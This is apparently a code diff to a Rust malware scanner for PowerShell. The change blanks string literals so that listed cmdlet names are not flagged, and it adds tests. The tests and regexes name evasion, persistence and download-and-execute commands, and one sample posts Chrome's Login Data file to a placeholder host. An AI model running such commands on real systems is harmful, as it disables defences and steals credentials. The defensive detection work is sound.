@@ -56,12 +56,6 @@ static EXEC: LazyLock<Regex> = LazyLock::new(|| {
 static DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)DownloadString|DownloadFile|Invoke-WebRequest|requests\.get|httpx\.get|Start-BitsTransfer|curl(?:\.exe)?|wget").unwrap()
 });
-static EVASION: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)Add-MpPreference\s+-Exclusion|Set-MpPreference\s+-DisableRealtimeMonitoring|AmsiUtils|AmsiScanBuffer|wevtutil(?:\.exe)?\s+cl\b|Clear-EventLog").unwrap()
-});
-static PERSISTENCE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)schtasks(?:\.exe)?\s+/create|Register-ScheduledTask|New-ScheduledTask|New-Service|CurrentVersion[\\/]+Run").unwrap()
-});
 static ENCODED_EXEC: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)-enc(?:odedcommand)?\b|FromBase64String\s*\(|b64decode\s*\(|\batob\s*\(")
         .unwrap()
@@ -584,40 +578,152 @@ fn split_comments(text: &str, lang: Lang) -> (String, String) {
 
 const MAX_STATEMENTS: usize = 200_000;
 
-/// Logical statements: lines joined across explicit continuations, split on `;`.
-/// Capped; the caller marks the analysis incomplete when the cap is reached.
-fn statements(code: &str) -> (Vec<String>, bool) {
-    let mut out = Vec::new();
-    let mut current = String::new();
-    let flush = |current: &mut String, out: &mut Vec<String>| {
-        out.extend(
-            current
-                .split(';')
-                .map(str::trim)
-                .filter(|s| !s.is_empty())
-                .map(str::to_owned),
-        );
-        current.clear();
+/// PowerShell string literals with their contents blanked (same byte length,
+/// newlines kept): cmdlet names listed *as data* (e.g. the export lists of a
+/// `.psd1` manifest) are then not mistaken for invocations. Expandable
+/// strings containing `$(` subexpressions are kept, since that part is code.
+/// Handles '...' (with ''), "..." (with `` ` `` escapes and ""), and the
+/// here-strings @'...'@ / @"..."@. Unterminated strings stay as code.
+pub(crate) fn blank_ps_strings(code: &str) -> String {
+    let bytes = code.as_bytes();
+    let mut out = bytes.to_vec();
+    let blank = |out: &mut [u8], from: usize, to: usize| {
+        for b in &mut out[from..to] {
+            if *b != b'\n' && *b != b'\r' {
+                *b = b' ';
+            }
+        }
     };
-    for line in code.lines() {
-        let trimmed = line.trim_end();
-        current.push_str(trimmed);
-        current.push(' ');
+    let mut i = 0;
+    while i < bytes.len() {
+        let c = bytes[i];
+        // Here-strings: @' or @" at the end of a line, closed by '@ / "@ at
+        // the start of a line.
+        if c == b'@' && i + 1 < bytes.len() && (bytes[i + 1] == b'\'' || bytes[i + 1] == b'"') {
+            let q = bytes[i + 1];
+            let rest = &bytes[i + 2..];
+            let line_end = rest.iter().position(|&b| b == b'\n');
+            let opens = line_end.is_some_and(|e| rest[..e].iter().all(|b| b.is_ascii_whitespace()));
+            if opens {
+                let body = i + 2 + line_end.unwrap_or(0) + 1;
+                let mut j = body;
+                let mut end = None;
+                while j < bytes.len() {
+                    let line_start = j == body || bytes[j - 1] == b'\n';
+                    if line_start {
+                        let mut k = j;
+                        while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
+                            k += 1;
+                        }
+                        if k + 1 < bytes.len() && bytes[k] == q && bytes[k + 1] == b'@' {
+                            end = Some((j, k + 2));
+                            break;
+                        }
+                    }
+                    j += 1;
+                }
+                if let Some((content_end, after)) = end {
+                    let keep = q == b'"' && code[body..content_end].contains("$(");
+                    if !keep {
+                        blank(&mut out, body, content_end);
+                    }
+                    i = after;
+                    continue;
+                }
+            }
+        }
+        if c == b'\'' || c == b'"' {
+            let mut j = i + 1;
+            let mut closed = None;
+            while j < bytes.len() {
+                let d = bytes[j];
+                if c == b'"' && d == b'`' {
+                    j += 2;
+                    continue;
+                }
+                if d == c {
+                    if j + 1 < bytes.len() && bytes[j + 1] == c {
+                        j += 2;
+                        continue;
+                    }
+                    closed = Some(j);
+                    break;
+                }
+                j += 1;
+            }
+            match closed {
+                Some(end) => {
+                    let keep = c == b'"' && code[i + 1..end].contains("$(");
+                    if !keep {
+                        blank(&mut out, i + 1, end);
+                    }
+                    i = end + 1;
+                    continue;
+                }
+                None => break,
+            }
+        }
+        i += 1;
+    }
+    // Only ASCII bytes inside strings were replaced by spaces and every
+    // non-ASCII byte replaced belonged to a whole blanked character, so the
+    // result is valid UTF-8; fall back to the original if it is not.
+    String::from_utf8(out).unwrap_or_else(|_| code.to_owned())
+}
+
+/// Logical statements: lines joined across explicit continuations, split on
+/// `;`. Splitting is decided on `blank` (strings blanked) and applied to
+/// `full` at the same byte positions, so both views stay aligned. Capped;
+/// the caller marks the analysis incomplete when the cap is reached.
+fn statement_pairs(blank: &str, full: &str) -> (Vec<(String, String)>, bool) {
+    debug_assert_eq!(blank.len(), full.len());
+    let mut out: Vec<(String, String)> = Vec::new();
+    let mut cur_b = String::new();
+    let mut cur_f = String::new();
+    let flush = |cb: &mut String, cf: &mut String, out: &mut Vec<(String, String)>| {
+        let mut start = 0;
+        for (pos, _) in cb.match_indices(';').chain(std::iter::once((cb.len(), ""))) {
+            let b = cb[start..pos].trim();
+            if !b.is_empty() {
+                // `;` positions in the blank view are `;` in the full view too.
+                let f = cf.get(start..pos).unwrap_or(b).trim();
+                out.push((b.to_owned(), f.to_owned()));
+            }
+            start = pos + 1;
+        }
+        cb.clear();
+        cf.clear();
+    };
+    let mut offset = 0;
+    for line_b in blank.split_inclusive('\n') {
+        let line_f = &full[offset..offset + line_b.len()];
+        offset += line_b.len();
+        let len = line_f.trim_end().len();
+        cur_b.push_str(&line_b[..len]);
+        cur_f.push_str(&line_f[..len]);
+        cur_b.push(' ');
+        cur_f.push(' ');
         let continues = ['`', '\\', '|', '(', ',', '+', '{']
             .iter()
-            .any(|&c| trimmed.ends_with(c));
-        if !continues || current.len() > 64 * 1024 {
-            flush(&mut current, &mut out);
+            .any(|&c| line_b.trim_end().ends_with(c));
+        if !continues || cur_b.len() > 64 * 1024 {
+            flush(&mut cur_b, &mut cur_f, &mut out);
         }
         if out.len() >= MAX_STATEMENTS {
             out.truncate(MAX_STATEMENTS);
             return (out, true);
         }
     }
-    flush(&mut current, &mut out);
+    flush(&mut cur_b, &mut cur_f, &mut out);
     let capped = out.len() > MAX_STATEMENTS;
     out.truncate(MAX_STATEMENTS);
     (out, capped)
+}
+
+#[cfg(test)]
+fn statements(code: &str) -> (Vec<String>, bool) {
+    let (pairs, capped) = statement_pairs(code, code);
+    (pairs.into_iter().map(|(b, _)| b).collect(), capped)
 }
 
 /// Content fetched into memory (not only saved to a file).
@@ -645,6 +751,15 @@ static RISKY_TARGET: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)\b(?:powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)(?:\.exe)?\b|cmd(?:\.exe)?\s+/c|-enc(?:odedcommand)?\b|-w(?:indowstyle)?\s+hidden|%(?:temp|appdata|localappdata)%|\$env:(?:temp|appdata|localappdata)|\\AppData\\|\\Users\\Public\\|https?://").unwrap()
 });
 
+/// Evasion done by commands (checked on code with strings blanked).
+static EVASION_CMD: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)Add-MpPreference\s+-Exclusion|Set-MpPreference\s+-DisableRealtimeMonitoring|wevtutil(?:\.exe)?\s+cl\b|Clear-EventLog").unwrap()
+});
+/// AMSI tampering usually names its targets in strings, so it is checked on
+/// the full text.
+static EVASION_AMSI: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)AmsiUtils|AmsiScanBuffer|amsiInitFailed").unwrap());
+
 /// Signs that a download is staged like a dropper rather than an installer:
 /// plain HTTP, an IP-literal URL, a user-writable/temporary location or a
 /// hidden window.
@@ -669,13 +784,25 @@ struct Findings {
     statements_capped: bool,
 }
 
-fn findings(code: &str) -> Findings {
-    let (statements, statements_capped) = statements(code);
+/// Analyze `full` code; `blank` is the same text with string literal
+/// contents blanked (identical for languages without that step). Command and
+/// call indicators are matched on `blank`, data (paths, URLs, credential
+/// store names) on `full`. A statement with a code-execution sink is read in
+/// full, since a string passed to `iex` is code.
+fn findings(full: &str, blank: &str) -> Findings {
+    let (statements, statements_capped) = statement_pairs(blank, full);
     let mut tainted: HashSet<String> = HashSet::new();
     let mut fetch_to_exec = false;
-    let mut risky_persistence = RUN_KEY.is_match(code);
-    for stmt in &statements {
-        let fetches = FETCH_CONTENT.is_match(stmt);
+    let mut risky_persistence = RUN_KEY.is_match(full);
+    let tainted_in = |text: &str, tainted: &HashSet<String>| {
+        !tainted.is_empty()
+            && IDENT
+                .find_iter(text)
+                .any(|m| tainted.contains(&m.as_str().to_ascii_lowercase()))
+    };
+    for (stmt, stmt_full) in &statements {
+        let sink = CODE_EXEC.is_match(stmt);
+        let fetches = FETCH_CONTENT.is_match(stmt) || (sink && FETCH_CONTENT.is_match(stmt_full));
         let (target, rhs) = match ASSIGN.captures(stmt) {
             Some(c) => {
                 let name = c.get(1).map_or("", |m| m.as_str());
@@ -688,11 +815,8 @@ fn findings(code: &str) -> Findings {
             }
             None => (None, stmt.as_str()),
         };
-        let uses_tainted = !tainted.is_empty()
-            && IDENT
-                .find_iter(rhs)
-                .any(|m| tainted.contains(&m.as_str().to_ascii_lowercase()));
-        if CODE_EXEC.is_match(stmt) && (fetches || uses_tainted) {
+        let uses_tainted = tainted_in(rhs, &tainted) || (sink && tainted_in(stmt_full, &tainted));
+        if sink && (fetches || uses_tainted) {
             fetch_to_exec = true;
         }
         if let Some(name) = target {
@@ -704,20 +828,20 @@ fn findings(code: &str) -> Findings {
                 tainted.remove(&name);
             }
         }
-        if TASK_OR_SERVICE.is_match(stmt) && RISKY_TARGET.is_match(stmt) {
+        if TASK_OR_SERVICE.is_match(stmt) && RISKY_TARGET.is_match(stmt_full) {
             risky_persistence = true;
         }
     }
     Findings {
-        credentials: CREDENTIAL.is_match(code),
-        sends: SEND.is_match(code) && NETWORK.is_match(code),
-        evasion: EVASION.is_match(code),
-        task_or_service: TASK_OR_SERVICE.is_match(code) || PERSISTENCE.is_match(code),
+        credentials: CREDENTIAL.is_match(full),
+        sends: SEND.is_match(blank) && NETWORK.is_match(full),
+        evasion: EVASION_CMD.is_match(blank) || EVASION_AMSI.is_match(full),
+        task_or_service: TASK_OR_SERVICE.is_match(blank) || RUN_KEY.is_match(full),
         risky_persistence,
-        download: DOWNLOAD.is_match(code) || FETCH_CONTENT.is_match(code),
-        exec: EXEC.is_match(code) || CODE_EXEC.is_match(code),
+        download: DOWNLOAD.is_match(blank) || FETCH_CONTENT.is_match(blank),
+        exec: EXEC.is_match(blank) || CODE_EXEC.is_match(blank),
         fetch_to_exec,
-        staging: STAGING.is_match(code),
+        staging: STAGING.is_match(full),
         statements_capped,
     }
 }
@@ -727,7 +851,12 @@ fn analyze_layer(layer: &Layer, lang: Lang, report: &mut Report) {
     // Decoded layers have no reliable syntax; they are analyzed whole.
     let lang = if layer.depth == 0 { lang } else { Lang::Other };
     let (code, comments) = split_comments(&layer.text, lang);
-    let f = findings(&code);
+    let blank = if lang == Lang::PowerShell {
+        blank_ps_strings(&code)
+    } else {
+        code.clone()
+    };
+    let f = findings(&code, &blank);
     if f.statements_capped {
         report.mark_incomplete("statement_limit");
     }
@@ -794,7 +923,7 @@ fn analyze_layer(layer: &Layer, lang: Lang, report: &mut Report) {
     }
     if layer.depth == 0
         && ENCODED_EXEC.is_match(&code)
-        && (EXEC.is_match(&code) || CODE_EXEC.is_match(&code))
+        && (EXEC.is_match(&blank) || CODE_EXEC.is_match(&blank))
     {
         report.add(
             "encoded_execution",
@@ -804,7 +933,7 @@ fn analyze_layer(layer: &Layer, lang: Lang, report: &mut Report) {
         );
     }
     if !comments.is_empty() {
-        let c = findings(&comments);
+        let c = findings(&comments, &comments);
         let persists = |x: &Findings| x.task_or_service || x.risky_persistence;
         if (c.credentials && !f.credentials)
             || (c.evasion && !f.evasion)
@@ -1064,6 +1193,71 @@ mod tests {
         );
         assert!(has(&r, "possible_exfiltration"));
         assert_eq!(r.risk, "high");
+    }
+
+    // --- P5-03: PowerShell string literals are data, not invocations ---
+
+    #[test]
+    fn cmdlet_names_listed_as_strings_are_not_invocations() {
+        let manifest = "@{\n  CmdletsToExport = @('Invoke-Expression', 'Invoke-RestMethod',\n    'Clear-EventLog', 'Register-ScheduledTask', 'Start-Process')\n}\n";
+        let r = scan(manifest, "Utility.psd1");
+        assert!(r.signals.is_empty(), "{:?}", r.signals);
+        assert_eq!(r.risk, "low_signal");
+    }
+
+    #[test]
+    fn strings_passed_to_execution_sinks_are_still_code() {
+        for code in [
+            "iex \"irm https://x.invalid/a\"",
+            "Invoke-Expression 'IEX (New-Object Net.WebClient).DownloadString(\"https://x.invalid\")'",
+            "$u = 'https://x.invalid'; $s = irm $u; iex \"$s\"",
+        ] {
+            let r = scan(code, "a.ps1");
+            assert!(has(&r, "download_and_execute"), "{code}");
+        }
+    }
+
+    #[test]
+    fn data_in_strings_still_counts() {
+        // AMSI targets, credential store names and URLs live in strings.
+        let r = scan(
+            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+            "a.ps1",
+        );
+        assert!(has(&r, "defense_evasion"));
+        let r = scan("$p = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\nInvoke-RestMethod -Uri 'https://x.invalid' -Method Post -InFile $p", "a.ps1");
+        assert!(has(&r, "possible_exfiltration"));
+        let r = scan("Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value y", "a.ps1");
+        assert!(has(&r, "persistence"));
+    }
+
+    #[test]
+    fn here_strings_and_escapes_are_blanked_correctly() {
+        let code = "$doc = @'\nInvoke-Expression and Clear-EventLog are only words here\n'@\n$q = 'it''s Start-Process'\n$d = \"a `\" Invoke-Expression\"\nGet-Date\n";
+        let blank = blank_ps_strings(code);
+        assert_eq!(blank.len(), code.len());
+        assert!(!blank.contains("Invoke-Expression"));
+        assert!(!blank.contains("Start-Process"));
+        assert!(blank.contains("Get-Date"));
+        assert_eq!(blank.matches('\n').count(), code.matches('\n').count());
+        let r = scan(code, "a.ps1");
+        assert!(r.signals.is_empty(), "{:?}", r.signals);
+    }
+
+    #[test]
+    fn subexpressions_and_unterminated_strings_are_not_hidden() {
+        let r = scan(
+            "$x = \"$(Invoke-Expression (irm https://x.invalid))\"",
+            "a.ps1",
+        );
+        assert!(has(&r, "download_and_execute"));
+        let r = scan(
+            "Clear-EventLog -LogName Application; $s = 'unterminated",
+            "a.ps1",
+        );
+        assert!(has(&r, "defense_evasion"));
+        let blank = blank_ps_strings("'\u{00e9}\u{3042}' + \"\u{1F600}\"");
+        assert_eq!(blank.len(), "'\u{00e9}\u{3042}' + \"\u{1F600}\"".len());
     }
 
     #[test]
